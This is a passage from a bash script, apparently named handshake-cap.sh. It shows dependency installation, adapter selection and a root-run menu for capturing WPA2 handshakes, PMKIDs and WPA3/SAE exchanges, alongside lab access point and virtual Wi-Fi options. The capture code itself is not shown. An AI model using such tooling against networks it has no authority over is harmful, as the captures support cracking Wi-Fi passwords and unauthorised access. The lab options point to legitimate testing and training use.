    if [[ -z "$pm" ]]; then
        red "[-] Missing tools: ${miss[*]} - install them for your distro."
        return
    fi
    yellow "[*] Installing missing tools: ${miss[*]}"
    case "$pm" in
        apt)   DEBIAN_FRONTEND=noninteractive apt-get update >/dev/null 2>&1
               DEBIAN_FRONTEND=noninteractive apt-get install -y "${miss[@]}" || true ;;
        dnf)   dnf install -y "${miss[@]}" || true ;;
        pacman) pacman -Sy --noconfirm "${miss[@]}" || true ;;
    esac
}

pick_interface() {
    local -a opt=()
    local i
    for d in /sys/class/net/*; do
        i="$(basename "$d")"
        [[ -e "$d/phy80211" ]] || continue
        case "$i" in *mon) continue;; esac
        opt+=("$i")
    done
    [[ ${#opt[@]} -gt 0 ]] || die "no wireless interfaces found"
    echo
    cyan "[*] Wireless adapters:"
    for i in "${!opt[@]}"; do
        printf '   %d) %s\n' "$((i+1))" "${opt[$i]}"
    done
    local dflt="${SAVED_IFACE:-}"
    local pick=""
    read -r -p "[>] Select (1-${#opt[@]})${dflt:+, ENTER to reuse '$dflt'}: " pick
    if [[ -z "$pick" ]] && [[ -n "$dflt" ]] && [[ -e "/sys/class/net/$dflt" ]]; then
        IFACE="$dflt"
    elif [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#opt[@]} ]]; then
        IFACE="${opt[$((pick-1))]}"
    else
        die "invalid adapter selection"
    fi
    green "[+] Using $IFACE"
}

# ---------------------------------------------------------------- menu
main_menu() {
    local mon_label ap_label data_label
    while true; do
        clear
        banner
        echo "[ Main Menu ]  iface: $IFACE | dir: $OUT_DIR"
        # NOTE: use if/elif here, NOT "a && green || b && red || yellow" chains -
        # &&/|| are left-associative so green can run AND red run for the same case.
        if [[ $HAS_MON -eq 1 ]]; then
            if [[ $MON_RX -eq 1 ]]; then
                mon_label=$(green "OK")
            elif [[ $MON_RX -eq 0 ]]; then
                mon_label=$(red "BROKEN")
            else
                mon_label=$(yellow "untested")
            fi
            if [[ $MON_RX_DATA -eq 1 ]]; then
                data_label=$(green "OK")
            elif [[ $MON_RX_DATA -eq 0 ]]; then
                data_label=$(red "BROKEN")
            else
                data_label=$(yellow "untested")
            fi
        else
            mon_label=$(red "unsupported")
            data_label=$(red "unsupported")
        fi
        if [[ $HAS_AP -eq 1 ]]; then
            ap_label=$(green "OK")
        else
            ap_label=$(red "unsupported")
        fi
        printf '    monitor RX : %s      DATA-RX: %s        AP mode : %s\n' "$mon_label" "$data_label" "$ap_label"
        if [[ -n "$TARGET_BSSID" ]]; then
            cyan "    Target: $TARGET_BSSID  (ch $TARGET_CH)  '$TARGET_ESSID'"
        else
            yellow "    No target selected"
        fi
        echo
        echo " 1) Scan / select WiFi network          (monitor)"
        echo " 2) Capture WPA1/WPA2 handshake         (monitor)"
        echo " 3) Capture WPA2 PMKID                  (monitor)"
        echo " 4) Capture WPA3/SAE                    (monitor)"
        echo " 5) WPA2 lab AP (hostapd) - NO monitor  (works on this card)"
        echo " 6) Diagnose capabilities/monitor RX"
        echo " 7) Show captured files"
        echo " 8) Virtual WiFi lab (software, mac80211_hwsim)"
        echo " 9) Exit"
        read -r -p $'\n[>] Select (1-9): ' choice
        case "$choice" in
            1) select_target ;;
            2) capture_wpa2 ;;
            3) capture_pmkid ;;
            4) capture_sae ;;
            5) ap_lab ;;
            6) diagnose ;;
            7) show_captures ;;
            8) hwsim_lab ;;
            9) cleanup; exit 0 ;;
            *) yellow "Invalid choice" ;;
        esac
        [[ "$choice" =~ ^[1-8]$ ]] && read -r -p "[-] Press ENTER to continue..."
    done
}

main() {
    banner
    [[ $EUID -eq 0 ]] || die "Run with sudo: sudo ./handshake-cap.sh"

    cyan "[*] Checking/installing dependencies..."
    install_deps

    load_conf
    [[ -z "${2:-}" ]] && [[ -n "${SAVED_OUT_DIR:-}" ]] && OUT_DIR="$SAVED_OUT_DIR"
    if [[ -z "$IFACE" ]]; then
        pick_interface
        save_conf
    fi
    [[ -e "/sys/class/net/$IFACE" ]]          || die "Interface $IFACE not found"
    [[ -e "/sys/class/net/$IFACE/phy80211" ]] || die "$IFACE is not a wireless interface"

    mkdir -p "$OUT_DIR"
    cd "$OUT_DIR" || die "cannot cd $OUT_DIR"

    capabilities
    main_menu
}

main "$@"